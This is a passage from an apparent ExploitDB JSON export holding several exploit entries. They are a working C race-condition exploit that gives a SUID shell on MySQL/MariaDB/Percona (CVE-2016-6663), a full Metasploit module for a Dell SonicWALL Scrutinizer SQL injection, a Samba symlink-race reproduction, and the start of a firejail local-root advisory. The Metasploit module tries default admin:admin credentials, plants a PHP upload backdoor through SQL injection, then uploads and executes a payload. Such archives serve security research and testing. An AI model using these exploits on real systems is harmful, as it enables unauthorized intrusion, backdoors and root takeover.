\"MySQL/PerconaDB/MariaDB - Privilege Escalation / Race Condition PoC Exploit\\n\"\r\n        \"mysql-privesc-race.c (ver. 1.0)\\n\\n\"\r\n        \"CVE-2016-6663 / OCVE-2016-5616\\n\\n\"\r\n        \"For testing purposes only. Do no harm.\\n\\n\"\r\n\t\"Discovered/Coded by:\\n\\n\"\r\n\t\"Dawid Golunski \\n\"\r\n\t\"http://legalhackers.com\"\r\n        \"\\033[0m\\n\\n\");\r\n\r\n}\r\n\r\nvoid usage(char *argv0) {\r\n    intro();\r\n    printf(\"Usage:\\n\\n%s user pass db_host database\\n\\n\", argv0);\r\n}\r\n\r\nvoid mysql_cmd(char *sql_cmd, int silent) {\r\n    \r\n    if (!silent) {\r\n\t    printf(\"%s \\n\", sql_cmd);\r\n    }\r\n    if (mysql_query(conn, sql_cmd)) {\r\n        fprintf(stderr, \"%s\\n\", mysql_error(conn));\r\n        exit(1);\r\n    }\r\n    res = mysql_store_result(conn);\r\n    if (res>0) mysql_free_result(res);\r\n\r\n}\r\n\r\n\r\nint main(int argc,char **argv)\r\n{\r\n\r\n    int randomnum = 0;\r\n    int io_notified = 0;\r\n    int myd_handle;\r\n    int wpid;\r\n    int is_shell_suid=0;\r\n    pid_t pid;\r\n    int status;\r\n    struct stat st;\r\n    /* io notify */\r\n    int fd;\r\n    int ret;\r\n    char buf[4096] __attribute__((aligned(8)));\r\n    int num_read;\r\n    struct inotify_event *event;\r\n    /* credentials */\r\n    char *user     = argv[1];\r\n    char *password = argv[2];\r\n    char *db_host  = argv[3];\r\n    char *database = argv[4];\r\n\r\n\r\n    // Disable buffering of stdout\r\n    setvbuf(stdout, NULL, _IONBF, 0);\r\n\r\n    // Get the params\r\n    if (argc!=5) {\r\n\tusage(argv[0]);\r\n\texit(1);\r\n    } \r\n    intro();\r\n    // Show initial privileges\r\n    printf(\"\\n[+] Starting the exploit as: \\n\");\r\n    system(\"id\");\r\n\r\n    // Connect to the database server with provided credentials\r\n    printf(\"\\n[+] Connecting to the database `%s` as %s@%s\\n\", database, user, db_host);\r\n    conn = mysql_init(NULL);\r\n    if (!mysql_real_connect(conn, db_host, user, password, database, 0, NULL, 0)) {\r\n        fprintf(stderr, \"%s\\n\", mysql_error(conn));\r\n        exit(1);\r\n    }\r\n\r\n    // Prepare tmp dir\r\n    printf(\"\\n[+] Creating exploit temp directory %s\\n\", \"/tmp/\" EXP_DIRN);\r\n    umask(000);\r\n    system(\"rm -rf /tmp/\" EXP_DIRN \" && mkdir /tmp/\" EXP_DIRN);\r\n    system(\"chmod g+s /tmp/\" EXP_DIRN );\r\n\r\n    // Prepare exploit tables :)\r\n    printf(\"\\n[+] Creating mysql tables \\n\\n\");\r\n    mysql_cmd(\"DROP TABLE IF EXISTS exploit_table\", 0);\r\n    mysql_cmd(\"DROP TABLE IF EXISTS mysql_suid_shell\", 0);\r\n    mysql_cmd(\"CREATE TABLE exploit_table (txt varchar(50)) engine = 'MyISAM' data directory '\" EXP_PATH \"'\", 0);\r\n    mysql_cmd(\"CREATE TABLE mysql_suid_shell (txt varchar(50)) engine = 'MyISAM' data directory '\" EXP_PATH \"'\", 0);\r\n\r\n    // Copy /bin/bash into the mysql_suid_shell.MYD mysql table file\r\n    // The file should be owned by mysql:attacker thanks to the sticky bit on the table directory\r\n    printf(\"\\n[+] Copying bash into the mysql_suid_shell table.\\n    After the exploitation the following file/table will be assigned SUID and executable bits : \\n\");\r\n    system(\"cp /bin/bash \" SUID_SHELL);\r\n    system(\"ls -l \" SUID_SHELL);\r\n\r\n    // Use inotify to get the timing right\r\n    fd = inotify_init();\r\n    if (fd < 0) {\r\n        printf(\"failed to inotify_init\\n\");\r\n        return -1;\r\n    }\r\n    ret = inotify_add_watch(fd, EXP_PATH, IN_CREATE | IN_CLOSE);\r\n\r\n\r\n    /* Race loop until the mysql_suid_shell.MYD table file gets assigned SUID+exec perms */\r\n\r\n    printf(\"\\n[+] Entering the race loop... Hang in there...\\n\");\r\n\r\n    while ( is_shell_suid != 1 ) {\r\n\r\n        cnt++;\r\n\tif ( (cnt % 100) == 0 ) {\r\n\t \tprintf(\"->\");\r\n\t \t//fflush(stdout);\t\r\n\t}\r\n\r\n        /* Create empty file , remove if already exists */\r\n        unlink(MYSQL_TEMP_FILE);\r\n        unlink(MYSQL_TAB_FILE);\r\n   \tmysql_cmd(\"DROP TABLE IF EXISTS exploit_table\", 1);\r\n\tmysql_cmd(\"CREATE TABLE exploit_table (txt varchar(50)) engine = 'MyISAM' data directory '\" EXP_PATH \"'\", 1);\r\n\r\n\t/* random num if needed */\r\n        srand ( time(NULL) );\r\n        randomnum = ( rand() % MAX_DELAY );\r\n\r\n        // Fork, to run the query asynchronously and have time to replace table file (MYD) with a symlink\r\n        pid = fork();\r\n        if (pid < 0) {\r\n            fprintf(stderr, \"Fork failed :(\\n\");\r\n        }\r\n\r\n        /* Child process - executes REPAIR TABLE  SQL statement */\r\n        if (pid == 0) {\r\n            usleep(500);\r\n            unlink(MYSQL_TEMP_FILE);\r\n\t    mysql_cmd(\"REPAIR TABLE exploit_table EXTENDED\", 1);\r\n            // child stops here\r\n            exit(0);\r\n        }\r\n\r\n        /* Parent process - aims to replace the temp .tmd table with a symlink before chmod */\r\n        if (pid > 0 ) {\r\n            io_notified = 0;\r\n\r\n            while (1) {\r\n                int processed = 0;\r\n                ret = read(fd, buf, sizeof(buf));\r\n                if (ret < 0) {\r\n                    break;\r\n                }\r\n                while (processed < ret) {\r\n                    event = (struct inotify_event *)(buf + processed);\r\n                    if (event->mask & IN_CLOSE) {\r\n                        if (!strcmp(event->name, \"exploit_table.TMD\")) {\r\n                            //usleep(randomnum);\r\n\r\n\t\t\t    // Set the .MYD permissions to suid+exec before they get copied to the .TMD file \r\n\t\t\t    unlink(MYSQL_TAB_FILE);\r\n\t\t\t    myd_handle = open(MYSQL_TAB_FILE, O_CREAT, 0777);\r\n\t\t\t    close(myd_handle);\r\n\t\t\t    chmod(MYSQL_TAB_FILE, 04777);\r\n\r\n\t\t\t    // Replace the temp .TMD file with a symlink to the target sh binary to get suid+exec\r\n                            unlink(MYSQL_TEMP_FILE);\r\n                            symlink(SUID_SHELL, MYSQL_TEMP_FILE);\r\n                            io_notified=1;\r\n                        }\r\n                    }\r\n                    processed += sizeof(struct inotify_event);\r\n                }\r\n                if (io_notified) {\r\n                    break;\r\n                }\r\n            }\r\n\r\n\r\n            waitpid(pid, &status, 0);\r\n        }\r\n\r\n\t// Check if SUID bit was set at the end of this attempt\r\n        if ( lstat(SUID_SHELL, &st) == 0 ) {\r\n\t    if (st.st_mode & S_ISUID) {\r\n\t\tis_shell_suid = 1;\r\n\t    }\r\n        } \r\n\r\n    }\r\n\r\n    printf(\"\\n\\n[+] \\033[94mBingo! Race won (took %lu tries) !\\033[0m Check out the \\033[94mmysql SUID shell\\033[0m: \\n\\n\", cnt);\r\n    system(\"ls -l \" SUID_SHELL);\r\n\r\n    printf(\"\\n[+] Spawning the \\033[94mmysql SUID shell\\033[0m now... \\n    Remember that from there you can gain \\033[1;31mroot\\033[0m with vuln \\033[1;31mCVE-2016-6662\\033[0m or \\033[1;31mCVE-2016-6664\\033[0m :)\\n\\n\");\r\n    system(SUID_SHELL \" -p -i \");\r\n    //system(SUID_SHELL \" -p -c '/bin/bash -i -p'\");\r\n\r\n    /* close MySQL connection and exit */\r\n    printf(\"\\n[+] Job done. Exiting\\n\\n\");\r\n    mysql_close(conn);\r\n    return 0;\r\n\r\n}",
                "description": "MySQL / MariaDB / PerconaDB 5.5.x/5.6.x/5.7.x - 'mysql' System User Privilege Escalation / Race Condition",
                "author": "Dawid Golunski",
                "_id": 40678,
                "source": "ExploitDB",
                "platform": "linux",
                "date": "2016-11-01T00:00:00+00:00",
                "cve": [
                    "CVE-2016-6663",
                    "CVE-2016-5616",
                    "CVE-2016-6662",
                    "CVE-2016-6664"
                ],
                "type": "local",
                "port": 0
            },
            {
                "code": "##\r\n# This module requires Metasploit: http://metasploit.com/download\r\n# Current source: https://github.com/rapid7/metasploit-framework\r\n##\r\n\r\nrequire 'msf/core'\r\n\r\nclass MetasploitModule < Msf::Exploit::Remote\r\n  Rank = ExcellentRanking\r\n\r\n  include Msf::Exploit::Remote::HttpClient\r\n  include Msf::Exploit::FileDropper\r\n  include Msf::Exploit::EXE\r\n\r\n  WINDOWS = /^win/i\r\n  LINUX   = /linux/i\r\n\r\n  def initialize(info={})\r\n    super(update_info(info,\r\n      'Name'           => \"Dell SonicWALL Scrutinizer 11.01 methodDetail SQL Injection\",\r\n      'Description'    => %q{\r\n        This module exploits a vulnerability found in Dell SonicWALL Scrutinizer. The methodDetail\r\n        parameter in exporters.php allows an attacker to write arbitrary files to the file system\r\n        with an SQL Injection attack, and gain remote code execution under the context of SYSTEM\r\n        for Windows, or as Apache for Linux.\r\n\r\n        Authentication is required to exploit this vulnerability, but this module uses\r\n        the default admin:admin credential.\r\n      },\r\n      'License'        => MSF_LICENSE,\r\n      'Author'         =>\r\n        [\r\n          'bperry', # Original discovery, PoC, and Metasploit module\r\n          'sinn3r'  # Metasploit module for native support\r\n        ],\r\n      'References'     =>\r\n        [\r\n          [ 'CVE', '2014-4977' ],\r\n          [ 'BID', '68495' ],\r\n          [ 'URL', 'http://seclists.org/fulldisclosure/2014/Jul/44' ],\r\n          [ 'URL','https://gist.github.com/brandonprry/76741d9a0d4f518fe297' ]\r\n        ],\r\n      'Arch'           => [ ARCH_X86 ],\r\n      'Platform'       => [ 'win', 'linux' ],\r\n      'Targets'        =>\r\n        [\r\n          [ 'Automatic', {} ],\r\n          [\r\n            'Dell SonicWALL Scrutinizer 11.01 on Windows',\r\n            {\r\n              'Arch'     => ARCH_X86,\r\n              'Platform' => 'win',\r\n            }\r\n          ],\r\n          [\r\n            'Dell SonicWALL Scrutinizer 11.01 Linux Appliance',\r\n            {\r\n              'Arch'     => ARCH_X86,\r\n              'Platform' => 'linux'\r\n            }\r\n          ]\r\n        ],\r\n      'Privileged'     => false,\r\n      'DisclosureDate' => 'Jul 24 2014',\r\n      'DefaultTarget'  => 0))\r\n\r\n    register_options(\r\n      [\r\n        OptString.new('TARGETURI', [ true, \"Base Application path\", \"/\" ]),\r\n        OptString.new('USERNAME', [ true,  'The username to authenticate as', 'admin' ]),\r\n        OptString.new('PASSWORD', [ true,  'The password to authenticate with', 'admin' ])\r\n      ], self.class)\r\n  end\r\n\r\n\r\n  # Prints a message with the target's IP and port.\r\n  #\r\n  # @param msg [String] Message to print.\r\n  # @return [void]\r\n  def print_status(msg='')\r\n    super(\"#{peer} - #{msg}\")\r\n  end\r\n\r\n\r\n  # Prints an error message with the target's IP and port.\r\n  #\r\n  # @param msg [String] Message to print.\r\n  # @return [void]\r\n  def print_error(msg='')\r\n    super(\"#{peer} - #{msg}\")\r\n  end\r\n\r\n\r\n  # Pads NULL columns for a SQL injection string.\r\n  #\r\n  # @param n [Fixnum] Number of nulls\r\n  # @return [String]\r\n  def pad_null(n)\r\n    padding = []\r\n\r\n    n.times do\r\n      padding << 'NULL'\r\n    end\r\n\r\n    padding * ','\r\n  end\r\n\r\n\r\n  # Checks (explicitly) the target for the vulnerability. To be able to check this, a\r\n  # valid username/password is required.\r\n  #\r\n  # @return [void]\r\n  def check\r\n    begin\r\n      res = do_login\r\n    rescue Msf::Exploit::Failed => e\r\n      vprint_error(e.message)\r\n      return Exploit::CheckCode::Unknown\r\n    end\r\n\r\n    uid = res['userid']\r\n    sid = res['sessionid']\r\n    pattern = Rex::Text.rand_text_alpha(10)\r\n    sqli_str = \"-6045 UNION ALL SELECT '#{pattern}',#{pad_null(19)}\"\r\n    res = do_sqli(sqli_str, sid, uid).get_json_document\r\n    return Exploit::CheckCode::Vulnerable if res['id'].to_s == pattern\r\n\r\n    Exploit::CheckCode::Safe\r\n  end\r\n\r\n\r\n  # Returns the OS information by using @@version_compile_os.\r\n  #\r\n  # @param sid [String] Session ID.\r\n  # @param uid [String] User ID.\r\n  # @return [String] The OS information.\r\n  def get_os(sid, uid)\r\n    sqli_str = \"-6045 UNION ALL SELECT @@version_compile_os,#{pad_null(19)}\"\r\n    res = do_sqli(sqli_str, sid, uid).get_json_document\r\n    res['id']\r\n  end\r\n\r\n\r\n  # Returns target's d4d directory path that will be used to upload our malicious files.\r\n  #\r\n  # @param os [String] OS information.\r\n  # @return [String]\r\n  def get_d4d_path(os)\r\n    case os\r\n    when WINDOWS\r\n      # On Windows, the full d4d path looks something like this:\r\n      # C:\\Program Files\\Scrutinizer\\html\\d4d\r\n      '../../html/d4d'\r\n    when LINUX\r\n      # On the Linux appliance, the d4d path looks exactly like this:\r\n      '/home/plixer/scrutinizer/html/d4d'\r\n    end\r\n  end\r\n\r\n\r\n  # Logs into Dell SonicWALL Scrutinizer.\r\n  #\r\n  # @return [Hash] JSON response.\r\n  def do_login\r\n    res = send_request_cgi({\r\n      'uri' => normalize_uri(target_uri, '/cgi-bin/login.cgi'),\r\n      'vars_get' => {\r\n        'name' => datastore['USERNAME'],\r\n        'pwd' => datastore['PASSWORD']\r\n      }\r\n    })\r\n\r\n    unless res\r\n      fail_with(Failure::Unknown, 'The connection timed out while attempting to log in.')\r\n    end\r\n\r\n    res = res.get_json_document\r\n\r\n    if res['noldapnouser']\r\n      fail_with(Failure::NoAccess, \"Username '#{datastore['USERNAME']}' is incorrect.\")\r\n    elsif res['loginfailed']\r\n      fail_with(Failure::NoAccess, \"Password '#{datastore['PASSWORD']}' is incorrect.\")\r\n    end\r\n\r\n    report_cred(datastore['USERNAME'], datastore['PASSWORD'])\r\n\r\n    res\r\n  end\r\n\r\n\r\n  # Saves a valid username/password to database.\r\n  #\r\n  # @param username [String]\r\n  # @param password [String]\r\n  # @return [void]\r\n  def report_cred(username, password)\r\n    service_data = {\r\n      address: rhost,\r\n      port: rport,\r\n      service_name: ssl ? 'https' : 'http',\r\n      protocol: 'tcp',\r\n      workspace_id: myworkspace_id\r\n    }\r\n\r\n    credential_data = {\r\n      module_fullname: self.fullname,\r\n      origin_type: :service,\r\n      username: username,\r\n      private_data: password,\r\n      private_type: :password\r\n    }.merge(service_data)\r\n\r\n    credential_core = create_credential(credential_data)\r\n\r\n    login_data = {\r\n      core: credential_core,\r\n      last_attempted_at: DateTime.now,\r\n      status: Metasploit::Model::Login::Status::SUCCESSFUL\r\n    }.merge(service_data)\r\n\r\n    create_credential_login(login_data)\r\n  end\r\n\r\n\r\n  # Injects malicious SQL string to the methodDetail parameter against the target machine.\r\n  #\r\n  # @param method_detail [String] Malicious SQL injection string.\r\n  # @param sid [String] Session ID.\r\n  # @param uid [String] User ID.\r\n  # @return [Rex::Proto::Http::Response]\r\n  def do_sqli(method_detail, sid, uid)\r\n    res = send_request_cgi({\r\n      'uri'      => normalize_uri(target_uri, '/d4d/exporters.php'),\r\n      'vars_get' => { 'methodDetail'=> method_detail },\r\n      'cookie'   => \"cookiesenabled=1;sessionid=#{sid};userid=#{uid}\"\r\n    })\r\n\r\n    unless res\r\n      fail_with(Failure::Unknown, 'The connection timed out for exporters.php.')\r\n    end\r\n\r\n    res\r\n  end\r\n\r\n\r\n  # Returns a PHP backdoor that is to be uploaded onto the target machine.\r\n  #\r\n  # @param os [String] Target OS information.\r\n  # @param target_path [String]\r\n  # @return [String] PHP backdoor\r\n  def get_php_backdoor(os)\r\n    case os\r\n    when WINDOWS\r\n      chmod_code = %Q|chmod($bname, 0777);|\r\n      exec_code = %Q|exec($bname);|\r\n    when LINUX\r\n      chmod_code = %Q|chmod(\"./\" . $bname, 0777);|\r\n      exec_code = %Q|exec(\"./\" . $bname);|\r\n    end\r\n\r\n    %Q|<?php\r\n    $bname = basename( $_FILES['uploadedfile']['name']);\r\n    $target_path = \"./\" . $bname;\r\n    move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path);\r\n    #{chmod_code}\r\n    #{exec_code}\r\n    ?>\r\n    |.gsub(/\\x20{4}/, ' ')\r\n  end\r\n\r\n\r\n  # Uploads the executable payload via malicious PHP backdoor.\r\n  #\r\n  # @param backdoor_fname [String] Name of the backdoor\r\n  # @param payload_fname [String] Name of the executable payload\r\n  # @return [void]\r\n  def upload_payload(backdoor_fname, payload_fname)\r\n    p = generate_payload_exe(\r\n      code: payload.encoded,\r\n      platform: @my_target.platform,\r\n      arch: @my_target.arch\r\n    )\r\n\r\n    print_status(\"Uploading #{payload_fname} (#{p.length} bytes)...\")\r\n\r\n    post_data = Rex::MIME::Message.new\r\n    post_data.add_part(\r\n      p,\r\n      'application/octet-stream',\r\n      'binary',\r\n      \"form-data; name=\\\"uploadedfile\\\"; filename=\\\"#{payload_fname}\\\"\"\r\n    )\r\n    data = post_data.to_s\r\n\r\n    res = send_request_cgi({\r\n      'method' => 'POST',\r\n      'uri'    => normalize_uri(target_uri, \"/d4d/#{backdoor_fname}\"),\r\n      'ctype'  => \"multipart/form-data; boundary=#{post_data.bound}\",\r\n      'data'   => data\r\n    })\r\n\r\n    unless res\r\n      # Here we are not using fail_with, because when we get a session, it seems to be creating\r\n      # the same effect as connection hanging... and then eventually times out. If that\r\n      # happens, a fail_with() can cause msfconsole to believe there is no session created.\r\n      vprint_status('Connection timed out while uploading payload.')\r\n      return\r\n    end\r\n\r\n    if res.code == 404\r\n      fail_with(Failure::Unknown, \"Server returned 404 for #{backdoor_fname}.\")\r\n    end\r\n  end\r\n\r\n\r\n  # Uploads the PHP backdoor onto the target machine. The reason of using a PHP backdoor to upload\r\n  # is because our SQL injection is in a GET method, and Apache has a max length of 8190 bytes,\r\n  # which is bad for some built-in or custom payloads.\r\n  #\r\n  # @param opts [Hash]\r\n  # @option opts [String] :d4d_path\r\n  # @option opts [String] :backdoor_fname\r\n  # @option opts [String] :payload_fname\r\n  # @option opts [String] :sid\r\n  # @option opts [String] :uid\r\n  # @option opts [String] :os\r\n  # @return [void]\r\n  def upload_php_backdoor(opts)\r\n    d4d_path       = opts[:d4d_path]\r\n    backdoor_fname = opts[:backdoor_fname]\r\n    payload_fname  = opts[:payload_fname]\r\n    sid            = opts[:sid]\r\n    uid            = opts[:uid]\r\n    os             = opts[:os]\r\n\r\n    print_status(\"Injecting a PHP upload backdoor (#{backdoor_fname})...\")\r\n    hex_backdoor = get_php_backdoor(os).unpack(\"H*\")[0]\r\n    sqli_str = \"-6045 UNION ALL SELECT 0x#{hex_backdoor},#{pad_null(19)} INTO DUMPFILE '#{d4d_path}/#{backdoor_fname}' #\"\r\n    do_sqli(sqli_str, sid, uid)\r\n  end\r\n\r\n\r\n  # Attempts a SQL injection attack against the target machine.\r\n  #\r\n  # @param os [String] OS information.\r\n  # @param sid [String] Session ID.\r\n  # @param uid [String] User ID.\r\n  # @return [void]\r\n  def do_backdoor_sqli(os, sid, uid)\r\n    backdoor_fname = \"#{Rex::Text.rand_text_alpha(6)}.php\"\r\n    payload_fname  = Rex::Text.rand_text_alpha(5)\r\n    payload_fname << '.exe' if @my_target['Platform'].match(WINDOWS)\r\n    d4d_path       = get_d4d_path(os)\r\n\r\n    register_files_for_cleanup(backdoor_fname, payload_fname)\r\n\r\n    opts = {\r\n      d4d_path: d4d_path,\r\n      backdoor_fname: backdoor_fname,\r\n      payload_fname: payload_fname,\r\n      sid: sid,\r\n      uid: uid,\r\n      os: os\r\n    }\r\n\r\n    upload_php_backdoor(opts)\r\n    upload_payload(backdoor_fname, payload_fname)\r\n  end\r\n\r\n\r\n  # Tries to set the target. If the user manually set one, then avoid automatic target.\r\n  #\r\n  # @param os [String] OS information.\r\n  # @return [void]\r\n  def try_set_target(os)\r\n    @my_target = target if target != targets[0]\r\n    case os\r\n    when WINDOWS\r\n      @my_target = targets[1]\r\n    when LINUX\r\n      @my_target = targets[2]\r\n    else\r\n      fail_with(Failure::NoTarget, 'Unsupported target')\r\n    end\r\n  end\r\n\r\n\r\n  # Exploits the target machine. To do this, first we must log into the system in order to obtain\r\n  # the user ID and session ID. After logging in, we can ask the vulnerable code to upload a\r\n  # malicious PHP backdoor, and then finally use that backdoor to upload and execute our payload.\r\n  def exploit\r\n    res = do_login\r\n    uid = res['userid']\r\n    sid = res['sessionid']\r\n    os = get_os(sid, uid)\r\n    print_status(\"Detected OS information: #{os}\")\r\n    try_set_target(os)\r\n    do_backdoor_sqli(os, sid, uid)\r\n  end\r\n\r\nend",
                "description": "Dell SonicWALL Scrutinizer 11.01 - methodDetail SQL Injection (Metasploit)",
                "author": "Metasploit",
                "_id": 39836,
                "source": "ExploitDB",
                "platform": "multiple",
                "date": "2016-05-17T00:00:00+00:00",
                "cve": [],
                "type": "remote",
                "port": 0
            },
            {
                "code": "Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1039\r\n\r\nThe Samba server is supposed to only grant access to configured share\r\ndirectories unless \"wide links\" are enabled, in which case the server is allowed\r\nto follow symlinks. The default (since CVE-2010-0926) is that wide links are\r\ndisabled.\r\n\r\nsmbd ensures that it isn't following symlinks by calling lstat() on every\r\npath component, as can be seen in strace (in reaction to the request\r\n\"get a/b/c/d/e/f/g/h/i/j\", where /public is the root directory of the share):\r\n\r\nroot@debian:/home/user# strace -e trace=file -p18954\r\nProcess 18954 attached\r\nlstat(\"a/b/c/d/e/f/g/h/i/j\", {st_mode=S_IFREG|0644, st_size=4, ...}) = 0\r\ngetcwd(\"/public\", 4096)                 = 8\r\nlstat(\"/public/a\", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0\r\nlstat(\"/public/a/b\", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0\r\nlstat(\"/public/a/b/c\", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0\r\nlstat(\"/public/a/b/c/d\", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0\r\nlstat(\"/public/a/b/c/d/e\", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0\r\nlstat(\"/public/a/b/c/d/e/f\", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0\r\nlstat(\"/public/a/b/c/d/e/f/g\", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0\r\nlstat(\"/public/a/b/c/d/e/f/g/h\", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0\r\nlstat(\"/public/a/b/c/d/e/f/g/h/i\", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0\r\nlstat(\"/public/a/b/c/d/e/f/g/h/i/j\", {st_mode=S_IFREG|0644, st_size=4, ...}) = 0\r\nstat(\"a/b/c/d/e/f/g/h/i/j\", {st_mode=S_IFREG|0644, st_size=4, ...}) = 0\r\ngetxattr(\"a/b/c/d/e/f/g/h/i/j\", \"system.posix_acl_access\", 0x7ffc8d870c30, 132) = -1 ENODATA (No data available)\r\nstat(\"a/b/c/d/e/f/g/h/i/j\", {st_mode=S_IFREG|0644, st_size=4, ...}) = 0\r\nopen(\"a/b/c/d/e/f/g/h/i/j\", O_RDONLY)   = 35\r\n\r\n\r\nThis is racy: Any of the path components - either one of the directories or the\r\nfile at the end - could be replaced with a symlink by an attacker over a second\r\nconnection to the same share. For example, replacing a/b/c/d/e/f/g/h/i\r\nwith a symlink  to / immediately before the open() call would cause smbd to open\r\n/j.\r\n\r\nTo reproduce:\r\n\r\n - Set up a server with Samba 4.5.2. (I'm using Samba 4.5.2 from Debian\r\n   unstable. I'm running the attacks on a native machine while the server is\r\n   running in a VM on the same machine.)\r\n - On the server, create a world-readable file \"/secret\" that contains some\r\n   text. The goal of the attacker is to leak the contents of that file.\r\n - On the server, create a directory \"/public\", mode 0777.\r\n - Create a share named \"public\", accessible for guests, writable, with path\r\n   \"/public\".\r\n - As the attacker, patch a copy of the samba-4.5.2 sourcecode with the patch in\r\n   attack_commands.patch.\r\n - Build the patched copy of samba-4.5.2. The built smbclient will be used in\r\n   the following steps.\r\n - Prepare the server's directory layout remotely and start the rename side of\r\n   the race:\r\n\r\n   $ ./bin/default/source3/client/smbclient -N -U guest //192.168.56.101/public\r\n   ./bin/default/source3/client/smbclient: Can't load /usr/local/samba/etc/smb.conf - run testparm to debug it\r\n   Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.5.2-Debian]\r\n   smb: \\> posix\r\n   Server supports CIFS extensions 1.0\r\n   Server supports CIFS capabilities locks acls pathnames posix_path_operations large_read posix_encrypt\r\n   smb: /> ls\r\n     .                                   D        0  Wed Dec 14 23:54:30 2016\r\n     ..                                  D        0  Wed Dec 14 13:02:50 2016\r\n\r\n        98853468 blocks of size 1024. 66181136 blocks available\r\n   smb: /> symlink / link\r\n   smb: /> mkdir normal\r\n   smb: /> put /tmp/empty normal/secret # empty file\r\n   putting file /tmp/empty as /normal/secret (0.0 kb/s) (average 0.0 kb/s)\r\n   smb: /> rename_loop link normal foobar\r\n\r\n - Over a second connection, launch the read side of the race:\r\n\r\n   $ ./bin/default/source3/client/smbclient -N -U guest //192.168.56.101/public\r\n   ./bin/default/source3/client/smbclient: Can't load /usr/local/samba/etc/smb.conf - run testparm to debug it\r\n   Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.5.2-Debian]\r\n   smb: \\> posix\r\n   Server supports CIFS extensions 1.0\r\n   Server supports CIFS capabilities locks acls pathnames posix_path_operations large_read posix_encrypt\r\n   smb: /> dump foobar/secret\r\n\r\n - At this point, the race can theoretically be hit. However, because the\r\n   renaming client performs operations synchronously, the network latency makes\r\n   it hard to win the race. (It shouldn't be too hard to adapt the SMB client to\r\n   be asynchronous, which would make the attack much more practical.) To make it\r\n   easier to hit the race, log in to the server as root and run \"strace\" against\r\n   the process that is trying to access foobar/secret all the time without any\r\n   filtering (\"strace -p19624\"). On my machine, this causes the race to be hit\r\n   every few seconds, and the smbclient that is running the \"dump\" command\r\n   prints the contents of the file each time the race is won.\r\n\r\n\r\nProof of Concept:\r\nhttps://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41740.zip",
                "description": "Samba 4.5.2 - Symlink Race Permits Opening Files Outside Share Directory",
                "author": "Google Security Research",
                "_id": 41740,
                "source": "ExploitDB",
                "platform": "multiple",
                "date": "2017-03-27T00:00:00+00:00",
                "cve": [
                    "CVE-2010-0926"
                ],
                "type": "remote",
                "port": 0
            },
            {
                "code": "# firejail advisory for TOCTOU in --get and --put (local root)\r\n\r\nReleasing a brief advisory/writeup about a local root privesc found in firejail that we reported back in Nov, 2016. This is in response to a recent [thread](http://seclists.org/oss-sec/2017/q1/20) on oss-sec where people seem interested in details of firejail security issues. This particular vulnerability was fixed in commit [e152e2d](https://github.com/netblue30/firejail/commit/e152e2d067e17be33c7e82ce438c8ae740af6a66) but no CVE was assigned.\r\n\r\n## Vulnerability\r\n\r\nThis is a TOCTOU (race condition) bug when testing access permissions with access() and then calling copy_file(). At the time of discovery, it was clear the code suffered from many insecure coding constructs like this and much more -- but there was no guideline around making security related bug reports (other than using the public issue tracker).\r\n\r\n### Code: src/firejail/ls.c\r\n~~~~\r\nvoid sandboxfs(int op, pid_t pid, const char *path) {\r\n        EUID_ASSERT();\r\n\r\n        // if the pid is that of a firejail  process, use the pid of the first child process\r\n        EUID_ROOT();\r\n        char *comm = pid_proc_comm(pid);\r\n        EUID_USER();\r\n        if (comm) {\r\n                if (strcmp(comm, \"firejail\") == 0) {\r\n                        pid_t child;\r\n                        if (find_child(pid, &child) == 0) {\r\n                                pid = child;\r\n                        }\r\n                }\r\n                free(comm);\r\n        }\r\n\r\n        // check privileges for non-root users\r\n        uid_t uid = getuid();\r\n        if (uid != 0) {\r\n                uid_t sandbox_uid = pid_get_uid(pid);\r\n                if (uid != sandbox_uid) {\r\n                        fprintf(stderr, \"Error: permission denied.\\n\");\r\n                        exit(1);\r\n                }\r\n        }\r\n\r\n        // full path or file in current directory?\r\n        char *fname;\r\n        if (*path == '/') {\r\n                fname = strdup(path);\r\n                if (!fname)\r\n                        errExit(\"strdup\");\r\n        }\r\n        else if (*path == '~') {\r\n                if (asprintf(&fname, \"%s%s\", cfg.homedir, path + 1) == -1)\r\n                        errExit(\"asprintf\");\r\n        }\r\n        else {\r\n                fprintf(stderr, \"Error: Cannot access %s\\n\", path);\r\n                exit(1);\r\n        }\r\n\r\n        // sandbox root directory\r\n        char *rootdir;\r\n        if (asprintf(&rootdir, \"/proc/%d/root\", pid) == -1)\r\n                errExit(\"asprintf\");\r\n\r\n        if (op == SANDBOX_FS_LS) {\r\n                EUID_ROOT();\r\n                // chroot\r\n                if (chroot(rootdir) < 0)\r\n                        errExit(\"chroot\");\r\n                if (chdir(\"/\") < 0)\r\n                        errExit(\"chdir\");\r\n\r\n                // access chek is performed with the real UID\r\n                if (access(fname, R_OK) == -1) {\r\n                        fprintf(stderr, \"Error: Cannot access %s\\n\", fname);\r\n                        exit(1);\r\n                }\r\n\r\n                // list directory contents\r\n                struct stat s;\r\n                if (stat(fname, &s) == -1) {\r\n                        fprintf(stderr, \"Error: Cannot access %s\\n\", fname);\r\n                        exit(1);\r\n                }\r\n                if (S_ISDIR(s.st_mode)) {\r\n                        char *rp = realpath(fname, NULL);\r\n                        if (!rp) {\r\n                                fprintf(stderr, \"Error: Cannot access %s\\n\", fname);\r\n                                exit(1);\r\n                        }\r\n                        if (arg_debug)\r\n                                printf(\"realpath %s\\n\", rp);\r\n\r\n                        char *dir;\r\n                        if (asprintf(&dir, \"%s/\", rp) == -1)\r\n                                errExit(\"asprintf\");\r\n\r\n                        print_directory(dir);\r\n                        free(rp);\r\n                        free(dir);\r\n                }\r\n                else {\r\n                        char *rp = realpath(fname, NULL);\r\n                        if (!rp) {\r\n                                fprintf(stderr, \"Error: Cannot access %s\\n\", fname);\r\n                                exit(1);\r\n                        }\r\n                        if (arg_debug)\r\n                                printf(\"realpath %s\\n\", rp);\r\n                        char *split = strrchr(rp, '/');\r\n                        if 